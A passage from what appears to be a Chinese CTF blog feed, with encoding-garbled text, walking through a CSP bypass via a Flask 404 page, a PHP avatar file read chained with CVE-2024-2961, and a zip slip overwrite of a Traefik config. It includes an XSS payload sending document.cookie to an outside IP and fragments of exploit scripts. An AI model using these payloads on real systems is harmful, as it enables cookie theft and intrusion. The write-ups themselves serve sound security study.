\u0026#34;URL parameter is missing!\u0026#34;}, 400 @app.errorhandler(404) def page_not_found(error): path = request.path return f\u0026#34;{path} not found\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰è®¾ç½®cspé™åˆ¶ï¼Œå…ˆæ‹¿å»CSPè¯„ä¼°ç½‘ç«™è¯„ä¼°ä¸€ä¸‹ï¼š\nä¸€ä¸ªobject-srcï¼Œæ§åˆ¶æ’ä»¶çš„ä¸€ä¸ªæŒ‡ä»¤ï¼Œä½†æ˜¯è¿™é‡Œç”¨ä¸äº†ã€‚ç»§ç»­å®¡ï¼Œåœ¨reportè·¯ç”±ï¼Œå¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªè®©botæ¥è®¿é—®çš„æ“ä½œã€‚çœ‹ä¸€ä¸‹bot.pyæ–‡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 from selenium import webdriver from selenium.webdriver.chrome.options import Options import time class Bot: def __init__(self): chrome_options = Options() chrome_options.add_argument(\u0026#34;--headless\u0026#34;) chrome_options.add_argument(\u0026#34;--disable-gpu\u0026#34;) chrome_options.add_argument(\u0026#34;--no-sandbox\u0026#34;) chrome_options.add_argument(\u0026#34;--disable-dev-shm-usage\u0026#34;) chrome_options.add_argument(\u0026#34;--disable-extensions\u0026#34;) chrome_options.add_argument(\u0026#34;--window-size=1920x1080\u0026#34;) self.driver = webdriver.Chrome(options=chrome_options) def visit(self, url): self.driver.get(\u0026#34;http://127.0.0.1:5000/\u0026#34;) self.driver.add_cookie({ \u0026#34;name\u0026#34;: \u0026#34;flag\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;SEKAI{dummy}\u0026#34;, \u0026#34;httponly\u0026#34;: False }) self.driver.get(url) time.sleep(1) self.driver.refresh() print(f\u0026#34;Visited {url}\u0026#34;) def close(self): self.driver.quit() å¯ä»¥çœ‹åˆ°åœ¨å…¶ä¸­çš„visit()è®¿é—®æ—¶ï¼Œæ˜¯å¸¦ä¸Šäº†flagçš„ï¼Œå¹¶ä¸”å°†httponlyè®¾ç½®ä¸ºäº†falseï¼ŒåŒæ—¶éœ€è¦æ³¨æ„ï¼Œè¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥æ˜¯ä½¿ç”¨çš„Googleå¼•æ“ã€‚\né‚£ä¹ˆåŸºæœ¬æ€è·¯å°±æ˜¯è·å–cookieï¼Œç°åœ¨å°±æ˜¯çœ‹æ€ä¹ˆè¿›è¡Œåˆ©ç”¨ã€‚\nçœ‹ä¸€ä¸‹å‰ç«¯å¤„ç†æ¸²æŸ“çš„app.jsä»£ç ï¼Œå…¶ä¸­çœ‹åˆ°äº†ä¸€ä¸ªè¿‡æ»¤å‡½æ•°ï¼š\n1 2 3 4 function sanitizeInput(str) { str = str.replace(/\u0026lt;.*\u0026gt;/igm, \u0026#39;\u0026#39;).replace(/\u0026lt;\\.*\u0026gt;/igm, \u0026#39;\u0026#39;).replace(/\u0026lt;.*\u0026gt;.*\u0026lt;\\/.*\u0026gt;/igm, \u0026#39;\u0026#39;); return str; } è´ªå©ªåŒ¹é…ï¼Œæ›¿æ¢ä¸ºç©ºï¼ŒåŸºæœ¬ä¸Šè¿‡æ»¤å®Œäº†ï¼Œä½†æ˜¯çœ‹å‡ºæ¥éƒ½æ˜¯åŒ¹é…çš„æ•´ä¸ª\u0026lt;\u0026gt;æ ‡ç­¾ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨\u0026lt;img\u0026gt;æ ‡ç­¾æ¥è¿›è¡Œå¼•å…¥ï¼Œè®©å…¶è‡ªåŠ¨åŒ¹é…\u0026gt;ï¼ˆæ³¨æ„è¿™é‡Œè¦çœ‹æ‡‚app.jsçš„æ¸²æŸ“æ‰å¥½æ‡‚ï¼‰ï¼š\nçœ‹æ­¤æ—¶çš„å‰ç«¯ï¼Œå¯ä»¥å‘ç°åº”æ˜¯æµè§ˆå™¨è‡ªåŠ¨è¡¥è¶³äº†ç¼ºå¤±çš„\u0026lt;/body\u0026gt;æ ‡ç­¾ï¼š\nä½†æ˜¯æš‚æ—¶åˆ©ç”¨ä¸äº†ï¼Œç»§ç»­çœ‹ã€‚æ³¨æ„çœ‹app.pyæ–‡ä»¶ä¸­çš„404å¤„ç†è¿‡ç¨‹ï¼š\n1 2 3 4 @app.errorhandler(404) def page_not_found(error): path = request.path return f\u0026#34;{path} not found\u0026#34; å¤„ç†404é¡µé¢æ—¶ï¼Œä¼šç›´æ¥åœ¨å°†è·¯å¾„æ‰“å°åœ¨é¡µé¢ä¸Šï¼Ÿ\nç¡®å®ä¼šï¼Œé‚£ä¹ˆåœ¨è¿™é‡Œå°±å¯ä»¥æ’å…¥ä»»æ„çš„jsæ ‡ç­¾ï¼Œæ¯”å¦‚ï¼š\nç¡®å®è§£æäº†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ‰§è¡Œjsè§£æã€‚æ­¤æ—¶çœ‹åˆ°æ§åˆ¶å°æŠ¥é”™ï¼š\nè¿™ä¸ªæ˜¯è¢«CSPé™åˆ¶äº†ï¼Œè¿™é‡Œæ‰æ³¨æ„åˆ°æºä»£ç ä¸­çš„CSPçš„è®¾ç½®æ˜¯å…¨éƒ¨è·¯ç”±ï¼š\n1 2 3 4 5 @app.after_request def add_security_headers(resp): resp.headers[ \u0026#39;Content-Security-Policy\u0026#39;] = \u0026#34;script-src \u0026#39;self\u0026#39;; style-src \u0026#39;self\u0026#39; https://fonts.googleapis.com https://unpkg.com \u0026#39;unsafe-inline\u0026#39;; font-src https://fonts.gstatic.com;\u0026#34; return resp å‰é¢å¿˜äº†ï¼Œä»¥ä¸ºæ˜¯åªæœ‰indexæ‰èƒ½ã€‚\næ‰€ä»¥éœ€è¦ç»•ä¸€ä¸‹è¿™ä¸ªcspï¼Œçœ‹äº†ä¸€ä¸‹åˆ«äººçš„wpï¼Œè¿™é‡Œçš„ç»•è¿‡æ–¹æ³•éå¸¸ç²¾å¦™å‘€ï¼Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯\u0026lt;script\u0026gt;æ ‡ç­¾çš„srcå±æ€§ï¼Œå½“æˆ‘ä»¬æŒ‡å®šsrcåï¼Œå¼•å…¥jsæ–‡ä»¶æ—¶å°±ä¼šæ‹¼æ¥ä¸Šè·¯å¾„ç„¶åè®¿é—®ï¼Œæ¯”å¦‚\n1 \u0026lt;script src=\u0026#34;/1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; é‚£ä¹ˆå¼•å…¥çš„æ–‡ä»¶æ—¶å‘é€çš„è¯·æ±‚æ˜¯http://hostname/1.jsï¼Œå‚è€ƒæ–‡ç« ï¼šhttps://blog.csdn.net/festone000/article/details/112030241 ã€‚\né‚£ä¹ˆåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°±é¢å¯ä»¥å°è¯•æ¥æ„é€ ä¸€ä¸‹404é¡µé¢ï¼Œä»è€Œæ¥ç»•è¿‡ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ‰è„æ•°æ®ï¼Œæ¯”å¦‚æˆ‘ä»¬æŒ‡å®šè®¿é—®/alert(1)æ–‡ä»¶ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„â€œæ–‡ä»¶â€å†…å®¹ä¸ºï¼š\næƒ³è¦è¿™é‡Œçš„ä»£ç æ­£ç¡®ï¼Œéœ€è¦ç»•ä¸€ä¸‹ã€‚æ¯”å¦‚å‰é¢çš„/ï¼Œæˆ‘ä»¬å°±å¯ä»¥åŠ ä¸€ä¸ª**/æ¥æ„é€ å¤šè¡Œæ³¨é‡Šçš„æ•ˆæœï¼Œç„¶ååé¢çš„å°±ä½¿ç”¨//æ¥å•è¡Œæ³¨é‡Šæ‰å³å¯ï¼Œæœ€åæˆåŠŸå¼¹çª—ï¼š\nå“‡ï¼ŒåŸæ¥srcå¼•å…¥çš„jsæ–‡ä»¶ï¼Œå¦‚æœæ˜¯æœ¬åœ°æ–‡ä»¶ï¼Œé‚£ä¹ˆåŒæ ·æ˜¯æ‹¼æ¥åˆ°urlä¸Šå»è®¿é—®è·å–å†…å®¹çš„ï¼Œæœ‰æ„æ€æœ‰æ„æ€ã€‚\né‚£ä¹ˆç°åœ¨å°±å¯ä»¥å°è¯•è·å–cookieï¼Œæ— httponlyï¼Œç›´æ¥å¤–å¸¦ï¼š\n1 \u0026lt;script%20src=\u0026#34;/**/fetch(`http://47.100.223.173:2333?cookie=${document.cookie}`)//\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; æœ¬åœ°è¯•äº†ä¸€ä¸‹ï¼Œedgeã€firefoxå’Œgoogleéƒ½èƒ½è§£æï¼Œä½†æ˜¯å°±æ˜¯æ‰“ä¸é€šåªèƒ½æ”¹payloadäº†ï¼š\n1 \u0026lt;script src=\u0026#34;/**/fetch(\u0026#39;http://47.100.223.173:2333/\u0026#39;+document.cookie)//\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; ç„¶åä¼ å‚ï¼š\nè¿™ä¸ªå°±æ‰“å‡ºæ¥äº†ï¼š\næœäº†ï¼Œåˆåœ¨è¿™ä¸ªç»†èŠ‚ç‚¹å¡äº†å¾ˆä¹…ã€‚\ndisplay N1CTF Junior 2025çš„é¢˜ï¼Œå…·ä½“çœ‹æˆ‘å¦ä¸€ç¯‡æ–‡ç« ï¼š\nhttps://fupanc-w1n.github.io/p/n1ctf-junior-2025/#display\nå‚è€ƒwpï¼š\nhttps://hackmd.io/@Whale120/HJ_rpvujC\nhttps://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless/\nhttps://www.justus.pw/writeups/sekai-ctf/tagless.html\nçŸ¥è¯†ç‚¹å‚è€ƒæ–‡ç« ï¼š\nhttps://www.cnblogs.com/kinyoobi/p/15341248.html\nhttps://juejin.cn/post/7426954121309356042#heading-5\nhttps://xz.aliyun.com/news/4716\nhttps://xz.aliyun.com/news/6968\n","date":"2025-02-17T00:52:17+08:00","permalink":"https://fupanc-w1n.github.io/p/%E6%B5%85%E8%B0%88csp%E7%BB%95%E8%BF%87/","title":"æµ…è°ˆCSPç»•è¿‡"},{"content":"WEB Gavatar é¢˜ç›®ç»™äº†dockeré™„ä»¶ï¼Œæ˜¯phpä»£ç ã€‚ç®€å•çœ‹äº†ä¸€ä¸‹webåº”ç”¨ï¼Œå°±æ˜¯ä¸€ä¸ªæ³¨å†Œ+ç™»å½•æ“ä½œï¼Œç„¶åå¯ä»¥ä¸Šä¼ å¤´åƒã€‚ç„¶åå°±æ˜¯å®¡è®¡ä»£ç ï¼š\nç®€å•è´´å‡ ä¸ªä»£ç å‡ºæ¥ï¼š\nregister.phpï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 \u0026lt;?php require_once \u0026#39;common.php\u0026#39;; if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] !== \u0026#39;POST\u0026#39;) { header(\u0026#39;Location: index.php\u0026#39;); exit; } $username = $_POST[\u0026#39;username\u0026#39;] ?? \u0026#39;\u0026#39;; $password = $_POST[\u0026#39;password\u0026#39;] ?? \u0026#39;\u0026#39;; if (empty($username) || empty($password)) { header(\u0026#39;Location: index.php?error=Invalid input\u0026#39;); exit; } if (findUserByUsername($username)) { header(\u0026#39;Location: index.php?error=Username already exists\u0026#39;); exit; } $user = [ \u0026#39;id\u0026#39; =\u0026gt; generateUuid(), \u0026#39;username\u0026#39; =\u0026gt; $username, \u0026#39;password\u0026#39; =\u0026gt; password_hash($password, PASSWORD_DEFAULT) ]; $db = getDb(); $db[\u0026#39;users\u0026#39;][] = $user; saveDb($db); $_SESSION[\u0026#39;user_id\u0026#39;] = $user[\u0026#39;id\u0026#39;]; header(\u0026#39;Location: profile.php\u0026#39;); upload.phpï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php require_once \u0026#39;common.php\u0026#39;; highlight_file(__FILE__); $user = getCurrentUser(); if (!$user) header(\u0026#39;Location: index.php\u0026#39;); $avatarDir = __DIR__ . \u0026#39;/avatars\u0026#39;; if (!is_dir($avatarDir)) mkdir($avatarDir, 0755); $avatarPath = \u0026#34;$avatarDir/{$user[\u0026#39;id\u0026#39;]}\u0026#34;; if (!empty($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { $finfo = new finfo(FILEINFO_MIME_TYPE); if (!in_array($finfo-\u0026gt;file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;]), [\u0026#39;image/jpeg\u0026#39;, \u0026#39;image/png\u0026#39;, \u0026#39;image/gif\u0026#39;])) { die(\u0026#39;Invalid file type\u0026#39;); } move_uploaded_file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;], $avatarPath); } elseif (!empty($_POST[\u0026#39;url\u0026#39;])) { $image = @file_get_contents($_POST[\u0026#39;url\u0026#39;]); if ($image === false) die(\u0026#39;Invalid URL\u0026#39;); file_put_contents($avatarPath, $image); } header(\u0026#39;Location: profile.php\u0026#39;); common.phpï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 \u0026lt;?php session_start(); function generateUuid() { return sprintf( \u0026#39;%04x%04x-%04x-%04x-%04x-%04x%04x%04x\u0026#39;, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0x0fff) | 0x4000, mt_rand(0, 0x3fff) | 0x8000, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff) ); } function getDb() { $dbPath = __DIR__ . \u0026#39;/../db/db.json\u0026#39;; if (!file_exists($dbPath)) { file_put_contents($dbPath, json_encode([\u0026#39;users\u0026#39; =\u0026gt; []])); } return json_decode(file_get_contents($dbPath), true) ?: [\u0026#39;users\u0026#39; =\u0026gt; []]; } function saveDb($data) { file_put_contents(__DIR__ . \u0026#39;/../db/db.json\u0026#39;, json_encode($data, JSON_PRETTY_PRINT)); } function findUserByUsername($username) { $db = getDb(); foreach ($db[\u0026#39;users\u0026#39;] as $user) { if ($user[\u0026#39;username\u0026#39;] === $username) return $user; } return null; } function getCurrentUser() { return isset($_SESSION[\u0026#39;user_id\u0026#39;]) ? findUserById($_SESSION[\u0026#39;user_id\u0026#39;]) : null; } function findUserById($id) { $db = getDb(); foreach ($db[\u0026#39;users\u0026#39;] as $user) { if ($user[\u0026#39;id\u0026#39;] === $id) return $user; } return null; } avatar.phpï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php require_once \u0026#39;common.php\u0026#39;; $user = isset($_GET[\u0026#39;user\u0026#39;]) ? findUserByUsername($_GET[\u0026#39;user\u0026#39;]) : null; $defaultAvatar = __DIR__ . \u0026#39;/images/default-avatar.png\u0026#39;; if (!$user) { header(\u0026#39;Content-Type: image/png\u0026#39;); readfile($defaultAvatar); exit; } $avatarPath = __DIR__ . \u0026#34;/avatars/{$user[\u0026#39;id\u0026#39;]}\u0026#34;; if (!file_exists($avatarPath)) { header(\u0026#39;Content-Type: image/png\u0026#39;); readfile($defaultAvatar); } else { header(\u0026#39;Content-Type: \u0026#39; . mime_content_type($avatarPath)); readfile($avatarPath); } å®¡è®¡ä»£ç ï¼Œç®€å•è¯´è¯´é€»è¾‘å§ï¼Œæ³¨å†Œæ—¶ä¼šéšæœºç”Ÿæˆå¼ºéšæœºçš„idï¼Œç„¶åå°†å…¶å†™å…¥åˆ°db.jsonæ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”ä¸Šä¼ çš„æ–‡ä»¶ä¼šé‡å‘½åå¹¶ç§»åŠ¨åˆ°avatarsç›®å½•ä¸‹ã€‚åœ¨upload.phpä¸­ï¼Œå¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 if (!empty($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { $finfo = new finfo(FILEINFO_MIME_TYPE); if (!in_array($finfo-\u0026gt;file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;]), [\u0026#39;image/jpeg\u0026#39;, \u0026#39;image/png\u0026#39;, \u0026#39;image/gif\u0026#39;])) { die(\u0026#39;Invalid file type\u0026#39;); } move_uploaded_file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;], $avatarPath); } elseif (!empty($_POST[\u0026#39;url\u0026#39;])) { $image = @file_get_contents($_POST[\u0026#39;url\u0026#39;]); if ($image === false) die(\u0026#39;Invalid URL\u0026#39;); file_put_contents($avatarPath, $image); } åœ¨è¿™ä¸ªelseifæ¡ä»¶ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯å­˜åœ¨æ–‡ä»¶è¯»å–ç„¶åæ–‡ä»¶å†™å…¥çš„æ“ä½œçš„ï¼Œä½†æ˜¯å¦‚æœæƒ³è¦è®¿é—®ï¼Œæœ€ç»ˆçš„åŸºäºç‚¹éƒ½æ˜¯éœ€è¦çŸ¥é“è¿™ä¸ªidï¼Œè¿™é‡Œæˆ‘æƒ³äº†ä¸€ä¸‹ï¼Œæ˜¯å¦èƒ½å¤Ÿé€šè¿‡è¦†ç›–æ‰idæ¥è¿›è¡Œå°è¯•ï¼Œä¸¤ä¸ªåœ°æ–¹ï¼Œä¸€ä¸ªæ˜¯åœ¨jsonæ–‡ä»¶ä¸­å°è¯•ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯åœ¨register.phpæ–‡ä»¶ä¸­å°è¯•ï¼š\n1 2 3 4 5 $user = [ \u0026#39;id\u0026#39; =\u0026gt; generateUuid(), \u0026#39;username\u0026#39; =\u0026gt; $username, \u0026#39;password\u0026#39; =\u0026gt; password_hash($password, PASSWORD_DEFAULT) ]; ä½†æ˜¯åœ¨æ³¨å†Œåå†™å…¥jsonæ–‡ä»¶æ—¶ï¼Œé‡‡ç”¨çš„æ˜¯json_encode($data, JSON_PRETTY_PRINT)ç»“æ„ï¼Œè¿™é‡Œæ˜¯ä¼šå°†ç‰¹æ®Šç¬¦å·è½¬ä¹‰çš„ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½è¿›è¡Œã€‚è¿˜æœ‰ä¸€ä¸ªå°±æ˜¯ç¬¬äºŒä¸ªï¼Œç»æµ‹è¯•ï¼Œæ˜¯å¯ä»¥è¿›è¡Œè¦†ç›–çš„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php function generateUuid() { return sprintf( \u0026#39;%04x%04x-%04x-%04x-%04x-%04x%04x%04x\u0026#39;, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0x0fff) | 0x4000, mt_rand(0, 0x3fff) | 0x8000, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff) ); } //$username=\u0026#34;\u0026#39;123\u0026#39;,\u0026#39;id\u0026#39; =\u0026gt; \u0026#39;123\u0026#39;,\u0026#34;; $user = [ \u0026#39;id\u0026#39; =\u0026gt; generateUuid(), \u0026#39;username\u0026#39; =\u0026gt; \u0026#34;admmm\u0026#34;, \u0026#39;id\u0026#39; =\u0026gt; \u0026#34;1111\u0026#34; ]; echo $user[\u0026#34;id\u0026#34;]; //outputï¼š1111 è¿™æ ·æ˜¯å¯ä»¥è¿›è¡Œçš„ã€‚ä½†æ˜¯ï¼Œåœ¨ä¼ å‚è§£ææ—¶ï¼Œåªä¼šå°†å…¶è®¾å®šä¸ºä¸€ä¸ªå€¼ã€‚ä¸å¯èƒ½é€šè¿‡ä¸€ä¸ªç®€å•çš„ä¼ å‚æ¥æ›´æ”¹åç«¯çš„é€»è¾‘ã€‚\næ‰€ä»¥åªèƒ½æ‰¾å…¶ä»–çš„åœ°æ–¹ã€‚æœ€ååœ¨avatar.phpæ–‡ä»¶ä¸­å‘ç°çªç ´ç‚¹ã€‚å°±ç®€å•è¯´è¯´é€»è¾‘å§ï¼Œå…·ä½“ä»£ç å›å»çœ‹ã€‚å°±æ˜¯é€šè¿‡ä¼ å‚usernameçš„å€¼ï¼Œä»db.jsonæ–‡ä»¶ä¸­è·å–åˆ°æ•´ä¸ªuserçš„ç»“æ„ï¼ˆåŒ…æ‹¬idç­‰ï¼‰ï¼Œç„¶åå†è·å–åˆ°idï¼Œæ‹¼æ¥åˆ°avataræ¥è¯»å–æ–‡ä»¶ï¼Œç„¶åè°ƒç”¨äº†readfile()è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œå…¶å®å°±æ˜¯ä¸Šä¼ å¤´åƒåæŸ¥çœ‹å¤´åƒçš„åŠŸèƒ½ã€‚åªæ˜¯æ”¹äº†ä¸€ä¸‹é€»è¾‘ï¼Œä¸æ˜¯ç®€å•çš„ç›´æ¥è®¿é—®è·¯å¾„æŸ¥çœ‹ï¼Œæ‰€ä»¥è¿™é‡Œæ—¶å¯ä»¥æ‹¿åˆ°æ–‡ä»¶å†…å®¹çš„ï¼Œå°è¯•å¦‚ä¸‹ï¼š\nå‰ç«¯è¦æ±‚å¿…é¡»ä¸ºç½‘å€ï¼Œç›´æ¥ç”¨fileåè®®è¯»å°±è¡Œï¼Œè¯»å–æ–‡ä»¶ï¼š\nç„¶åæŸ¥çœ‹å¤´åƒå†…å®¹ï¼š\næˆåŠŸè¯»å–ã€‚\nç»™äº†dockeræ–‡ä»¶ï¼Œå¯ä»¥çŸ¥é“æ˜¯éœ€è¦å‘½ä»¤æ‰§è¡Œreadflagçš„ã€‚æœ‰å›æ˜¾ï¼Œè°ƒç”¨æ–‡ä»¶å¤„ç†å‡½æ•°ï¼Œphpç‰ˆæœ¬ä¸º:\nç›´æ¥æ‰“CVE-2024-2961ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„sessionçš„é—®é¢˜ã€‚è®°ç€Session()ä¼šè‡ªåŠ¨ä¿å­˜cookieï¼Œç„¶åæˆ‘å°±åœ¨æ”¹è„šæœ¬ï¼Œä¸€ç›´æ²¡æ”¹å‡ºæ¥ï¼Œæœ€åæ”¹äº†å¦‚ä¸‹ä½ç½®ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def send(self, path: str) -\u0026gt; Response: \u0026#34;\u0026#34;\u0026#34;Sends given `path` to the HTTP server. Returns the response. \u0026#34;\u0026#34;\u0026#34; cookie = {\u0026#34;username\u0026#34;: \u0026#34;fupanc\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123\u0026#34;} self.session.post(\u0026#34;http://localhost:8000/register.php\u0026#34;, data=cookie) # cookie = {\u0026#34;username\u0026#34;:\u0026#34;fupanc\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;123\u0026#34;} # self.session.post(\u0026#34;http://localhost:8000/login.php\u0026#34;,data=cookie) return self.session.post(self.url, data={\u0026#34;url\u0026#34;: path}) def download(self, path: str) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Returns the contents of a remote file. \u0026#34;\u0026#34;\u0026#34; path = f\u0026#34;php://filter/convert.base64-encode/resource={path}\u0026#34; self.send(path) response=self.session.get(\u0026#34;http://localhost:8000/avatar.php?user=fupanc\u0026#34;) data = response.re.search(b\u0026#34;(.*)\u0026#34;, flags=re.S).group(1) return base64.decode(data) ç„¶åæ‰“å°±è¡Œäº†ï¼š\næœ€åè®¿é—®flag.txtå¾—åˆ°flagï¼š\nè¿™é‡Œå¾ˆæœçš„ä¸€ç‚¹æ˜¯ï¼Œå®¡ä»£ç ç¡®å®æ˜¯å®¡å‡ºæ¥å¯ä»¥ç›´æ¥åœ¨register.phpè·å–åˆ°cookieï¼Œä½†æ˜¯ä¸€ç›´æ‰“ä¸å‡ºæ¥ï¼Œåé¢å¤ç°çš„æ—¶å€™å‘ç°ï¼Œå°±æ˜¯å› ä¸ºæˆ‘æƒ³è¦è®©ç«¯å£æ›´å¤šå…ƒï¼Œæ²¡æœ‰ä½¿ç”¨docker-composeï¼Œå¯¼è‡´ä¸€ç›´æ‰“ä¸å‡ºæ¥ï¼š\næœ€åå°è¯•ä½¿ç”¨docker-composeæ‰æ‰“å‡ºæ¥çš„ã€‚æ²¡é”™ï¼å°±æ˜¯åœ¨register.phpå°±å¯ä»¥è·å–åˆ°cookieã€‚\nâ€”â€”â€”â€”â€”â€”\ntraefik goè¯­è¨€ï¼ŒåŒæ ·ç»™äº†æºä»£ç ã€‚ç®€å•å®¡è®¡ä¸€ä¸‹ï¼Œç›´æ¥åœ¨flagè·¯ç”±å°±å¯ä»¥è·å–åˆ°flagäº†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 r.GET(\u0026#34;/flag\u0026#34;, func(c *gin.Context) { xForwardedFor := c.GetHeader(\u0026#34;X-Forwarded-For\u0026#34;) if !strings.Contains(xForwardedFor, \u0026#34;127.0.0.1\u0026#34;) { c.JSON(400, gin.H{\u0026#34;error\u0026#34;: \u0026#34;only localhost can get flag\u0026#34;}) return } flag := os.Getenv(\u0026#34;FLAG\u0026#34;) if flag == \u0026#34;\u0026#34; { flag = \u0026#34;flag{testflag}\u0026#34; } c.String(http.StatusOK, flag) }) æœ‰è¯·æ±‚å¤´æ£€æµ‹ï¼Œä¼ªé€ ä¸€ä¸‹å°±è¡Œã€‚ä½†æ˜¯ç›´æ¥è®¿é—®å‘ç°æ˜¯404ã€‚é‚£ä¹ˆç»§ç»­å®¡ä»£ç å¯ä»¥å‘ç°æ˜¯æ–‡ä»¶ä¸Šä¼ +unzipï¼Œæƒ³åˆ°äº†zip slipï¼Œå¯ä»¥ä»»æ„æ–‡ä»¶è¦†ç›–ï¼Œå®¡è®¡æºç ï¼Œåœ¨unzipæ—¶ä½¿ç”¨çš„jion()å‡½æ•°ï¼š\nå¯ä»¥ç›®å½•ç©¿è¶Šå°è¯•è¦†ç›–æ–‡ä»¶ï¼Œå°±æ˜¯æ‰“zip slipäº†ï¼Œå¦‚ä¸‹æ–‡ç« ï¼š\nhttps://saucer-man.com/information_security/364.html\nç›´æ¥ç”¨é‡Œé¢çš„è„šæœ¬å°±è¡Œã€‚ä½†æ˜¯ç°åœ¨éœ€è¦çœ‹åœ¨å“ªé‡Œè¦†ç›–æ–‡ä»¶ï¼Œç»è¿‡æœç´¢ä»¥åŠç¿»å’Œå®¡è®¡dockeræ–‡ä»¶ï¼Œå‘ç°traefikå°±æ˜¯ä¸€ä¸ªåä»£ç†å·¥å…·ï¼Œå¹¶ä¸”é€šè¿‡dynamic.ymlæ–‡ä»¶æ¥è¿›è¡Œè·¯ç”±æµé‡çš„è½¬æ¥ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Dynamic configuration http: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯æ²¡æœ‰æ”¾è¡Œflagè·¯ç”±çš„ã€‚é‚£ä¹ˆå°±éœ€è¦å°è¯•ä¼ªé€ ä¸€ä¸‹ï¼Œæ³¨æ„çœ‹è¿™é‡Œçš„æ³¨é‡Šå¯ä»¥çŸ¥é“æ˜¯åŠ¨æ€é…ç½®çš„ï¼Œé‚£ä¹ˆå°±æ˜¯unzioæ—¶è§£å‹æ¥è¦†ç›–dynamic.ymlè¾¾åˆ°å…è®¸flagè·¯ç”±é€šè¿‡çš„æ•ˆæœã€‚\næœ€å¼€å§‹æ˜¯ç›´æ¥ä»¿é€ åˆ°ä¸Šé¢è¿™ä¸ªæ”¹æ”¹å°±è¡Œï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # Dynamic configuration http: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy flag: rule: Path(`/flag`) entrypoints: [web] service: proxy æˆåŠŸè¦†ç›–åå¯ä»¥è®¿é—®flagè·¯ç”±äº†ï¼Œå°è¯•ç›´æ¥åœ¨è¯·æ±‚å¤´ä¸­ç”¨XFFæ¥ä¼ªé€ ã€‚ä½†æ˜¯å§‹ç»ˆè·å–ä¸åˆ°flagã€‚åé¢å°±æƒ³ï¼Œæ˜¯ä¸æ˜¯è¿™ä¸ªtraefikå·¥å…·æ˜¯ä¸æ˜¯ä¸ä¼šè½¬å‘åŸè¯·æ±‚å¤´çš„å†…å®¹ï¼Œå¯ä»¥è‡ªå·±æ”¹ä¸€ä¸‹goçš„æºç æ¥è®²è¯·æ±‚å¤´æ‰“å°å‡ºæ¥ï¼Œæœ€åå‘ç°ç¡®å®æ˜¯ï¼š\nä¼šè‡ªåŠ¨è½¬å‘çœŸå®ipã€‚\næ‰“çš„è¯ï¼Œç”Ÿæˆæ–‡ä»¶ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬å°±è¡Œï¼š\n1 2 3 4 5 6 7 import zipfile # the name of the zip file to generate zf = zipfile.ZipFile(\u0026#39;out.zip\u0026#39;, \u0026#39;w\u0026#39;) # the name of the malicious file that will overwrite the origial file (must exist on 